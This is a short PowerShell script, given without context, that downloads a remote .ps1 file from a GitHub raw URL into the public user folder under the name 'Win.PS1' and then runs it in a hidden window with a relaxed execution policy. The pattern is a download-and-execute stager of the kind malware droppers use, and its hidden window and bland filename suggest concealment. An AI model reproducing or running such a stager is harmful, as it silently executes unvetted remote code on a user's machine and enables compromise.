[System.Net.WebClient] $WEB = New-Object System.Net.WebClient
$WEB.DownloadFile('https://raw.githubusercontent.com/dodbox/powertools/main/app.ps1', 'C:\Users\Public\Win.PS1')
PowerShell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy RemoteSigned -File C:\Users\Public\Win.PS1